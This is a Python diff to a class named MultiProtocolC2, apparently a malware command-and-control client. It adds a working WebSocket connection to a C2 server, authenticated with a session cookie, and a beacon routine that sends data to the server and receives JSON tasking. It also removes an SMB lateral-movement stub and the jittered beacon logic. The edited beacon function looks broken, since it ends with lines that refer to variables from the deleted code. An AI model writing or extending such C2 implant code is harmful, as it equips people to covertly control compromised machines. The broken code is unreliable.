@@ -181,38 +181,33 @@ class MultiProtocolC2:
     def _connect_websockets(self) -> bool:
         """Connect via WebSockets"""
         try:
-            # WebSocket connection for bidirectional communication
+            import websocket
 
-            logger.info("WebSocket C2 available (requires websocket-client)")
+            ws_url = f"wss://{self.c2_server}:{self.c2_port}/c2"
+            self._ws = websocket.WebSocket()
+            self._ws.settimeout(10)
+            self._ws.connect(ws_url, cookie=f"session={self.session_id}")
+            logger.success(f"WebSocket C2 connected to {ws_url}")
             return True
 
+        except ImportError:
+            logger.warning("websocket-client not installed, WebSocket C2 unavailable")
+            return False
         except Exception as e:
-            logger.error(f"WebSocket C2 failed: {e}")
+            logger.error(f"WebSocket C2 connection failed: {e}")
             return False
 
-    def _connect_smb(self) -> bool:
-        """Connect via SMB Named Pipes"""
+    def _beacon_websockets(self, data: bytes) -> Dict:
+        """Send WebSocket beacon"""
         try:
-            # SMB Named Pipes for lateral movement C2
-
-            logger.info("SMB C2 available (for lateral movement)")
-            return True
-
+            if hasattr(self, "_ws") and self._ws:
+                self._ws.send(data)
+                response = self._ws.recv()
+                if response:
+                    return json.loads(response.decode() if isinstance(response, bytes) else response)
+            return {}
         except Exception as e:
-            logger.error(f"SMB C2 failed: {e}")
-            return False
-
-    def beacon(self, data: Dict = None) -> Dict:
-        """Send beacon to C2 server"""
-        current_time = time.time()
-
-        # Apply jitter
-        jitter = self.beacon_interval * 0.3  # 30% jitter
-        import random
-
-        next_beacon = self.beacon_interval + random.uniform(-jitter, jitter)
-
-        if current_time - self.last_beacon < next_beacon:
+            logger.debug(f"WebSocket beacon failed: {e}")
             return {}
 
         self.last_beacon = current_time
